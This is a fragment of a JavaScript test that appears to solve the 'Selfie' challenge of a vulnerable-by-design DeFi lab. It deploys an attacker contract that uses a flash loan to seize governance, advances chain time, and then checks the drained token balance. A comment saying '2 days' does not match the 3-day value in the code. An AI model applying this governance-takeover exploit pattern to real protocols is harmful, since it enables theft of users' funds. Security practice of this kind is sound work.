...
describe("[Challenge] Selfie", function () {
  ...
  it("Execution", async function () {
    ...
    let testFlashloanSimpleGovernance = await (
      await ethers.getContractFactory("testFlashloanSimpleGovernance", player)
    ).deploy(pool.address, governance.address, token.address, player.address);
    await testFlashloanSimpleGovernance.start();

    await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 2 days
    await ethers.provider.send("evm_mine");

    await testFlashloanSimpleGovernance.end();

    let b = await token.balanceOf(player.address);
